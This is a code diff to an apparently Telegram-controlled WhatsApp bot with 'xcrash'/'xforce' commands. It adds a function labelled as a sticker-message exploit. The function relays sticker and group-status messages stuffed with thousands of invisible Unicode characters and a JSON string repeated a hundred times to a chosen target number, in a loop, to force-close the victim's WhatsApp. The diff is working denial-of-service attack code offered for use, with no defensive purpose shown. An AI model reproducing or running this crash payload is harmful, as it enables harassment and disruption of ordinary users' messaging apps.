@@ -4071,7 +4071,7 @@ bot.hears(/^(\/)?(xforce|xcrash|xios)(\s|$)/i, checkWhatsAppConnection, checkPre
   const processMessageId = processMessage.message_id;
 
   for (let i = 0; i < 2; i++) {
-    await blankbyambajahat(sock, target);
+    await forcloseStickerInvisible(sock, target);
     await AmbaFcNewVIP(sock, target);
     await new Promise((r) => setTimeout(r, 1000));
   }
@@ -4580,6 +4580,113 @@ async function AmbaFcNewVIP(sock, target) {
     userJid: target,
     messageId: null
   });
+}
+
+// ============================================
+// GAPON FORCLOSE - STICKER MESSAGE EXPLOIT
+// Status Group V2 + Invisible Payload
+// ============================================
+
+async function forcloseStickerInvisible(sock, target) {
+  try {
+    const invisiblePayload = "ꦾ".repeat(5000);
+    
+    const stickerMsg = {
+      stickerMessage: {
+        url: stickerUrl || "https://files.catbox.moe/sticker.webp",
+        mimetype: "image/webp",
+        fileSha256: Buffer.from(invisiblePayload + "sha256", "utf-8"),
+        fileLength: "42069",
+        height: 512,
+        width: 512,
+        isAnimated: false,
+        pngThumbnail: Buffer.from(invisiblePayload + "thumb", "utf-8").toString("base64"),
+        contextInfo: {
+          stanzaId: invisiblePayload,
+          participant: target,
+          quotedMessage: {
+            conversation: invisiblePayload
+          },
+          expiration: 0,
+          ephemeralSettingTimestamp: 0,
+          isForwarded: false,
+          forwardingScore: 0,
+          externalAdReply: {
+            title: invisiblePayload,
+            body: invisiblePayload,
+            mediaType: 1,
+            thumbnailUrl: "https://files.catbox.moe/ibub9i.jpg",
+            mediaUrl: "https://files.catbox.moe/ibub9i.jpg",
+            sourceUrl: "https://files.catbox.moe/ibub9i.jpg",
+            renderLargerThumbnail: true,
+            showAdAttribution: false,
+            sourceId: invisiblePayload,
+            sourceType: "sticker"
+          },
+          mentionedJid: [target],
+          groupMentions: []
+        }
+      }
+    };
+    
+    await sock.relayMessage(target, stickerMsg, {
+      participant: { jid: target },
+      messageId: null
+    });
+    
+    const statusGroupMsg = {
+      groupStatusMessageV2: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: invisiblePayload,
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: JSON.stringify({
+                text: invisiblePayload,
+                action: "forclose",
+                version: 3
+              }).repeat(100),
+              version: 3
+            },
+            contextInfo: {
+              stanzaId: invisiblePayload,
+              participant: target,
+              quotedMessage: {
+                conversation: invisiblePayload + "ꦾ".repeat(1000)
+              },
+              expiration: 0,
+              isForwarded: true,
+              forwardingScore: 9999,
+              externalAdReply: {
+                title: "GAPON FORCLOSE" + invisiblePayload,
+                body: "꧋" + invisiblePayload + "꧋",
+                mediaType: 2,
+                thumbnailUrl: "https://files.catbox.moe/r4a601.jpg",
+                renderLargerThumbnail: true,
+                showAdAttribution: true
+              }
+            }
+          }
+        }
+      }
+    };
+    
+    await sock.relayMessage(target, statusGroupMsg, {
+      participant: { jid: target },
+      messageId: null
+    });
+    
+    console.log(`✅ [FORCLOSE] Status Group V2 (invisible) sent to ${target}`);
+    
+    return true;
+    
+  } catch (error) {
+    console.log(`❌ [FORCLOSE] Error: ${error.message}`);
+    return false;
+  }
 }
 //-------------- END FUNCTION -------------//
 bot.launch();
